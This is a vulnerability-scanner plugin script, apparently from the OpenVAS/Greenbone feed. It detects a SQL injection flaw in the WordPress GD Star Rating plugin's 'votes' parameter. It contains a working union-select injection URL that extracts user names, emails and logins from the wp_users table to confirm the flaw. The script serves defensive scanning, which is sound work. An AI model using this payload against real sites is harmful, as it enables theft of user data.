CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802204" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)" );
	script_bugtraq_id( 48166 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "WordPress GD Star Rating Plugin 'votes' Parameter SQL Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/102095/wpstarrating-sql.txt" );
	script_xref( name: "URL", value: "http://downloads.securityfocus.com/vulnerabilities/exploits/48166.txt" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to cause SQL Injection
  attack and gain sensitive information." );
	script_tag( name: "affected", value: "WordPress GD Star Rating Plugin version 1.9.8 and prior." );
	script_tag( name: "insight", value: "The flaw is caused by improper validation of user-supplied input
  passed via the 'votes' parameter to /wp-content/plugins/gd-star-rating/ajax.php,
  which allows attacker to manipulate SQL queries by injecting arbitrary SQL code.

  *****
  NOTE: The exploit will work only when nonce is disabled, by default it is enabled.
  *****" );
	script_tag( name: "summary", value: "This host is running WordPress GD Star Rating Plugin and is prone
  to SQL injection vulnerability." );
	script_tag( name: "solution", value: "Update to GD Star Rating Plugin version 1.9.9." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/gd-star-rating/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
vtstrings = get_vt_strings();
url = NASLString( dir, "/wp-content/plugins/gd-star-rating/ajax.php?vote_type=cache", "&vote_domain=a&votes=asr.1.xxx.1.2.5+limit+0+union+select+1,", "0x535242,1,1,concat(0x613a313a7b733a363a226e6f726d616c223b733a3", "23030303a22,substring(concat((select+concat(0x", vtstrings["default_hex"], ",0x3a,user_nicename,0x3a,user_email,0x3a,user_login,0x3a,", vtstrings["default_hex"], ")+from+wp_users+where+length(user_pass)>0+order+by+id+", "limit+0,1),repeat(0x20,2000)),1,2000),0x223b7d),1,1,1+limit+1" );
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: ">" + vtstrings["default"] + ":(.+):(.+):(.+):" + vtstrings["default"] )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

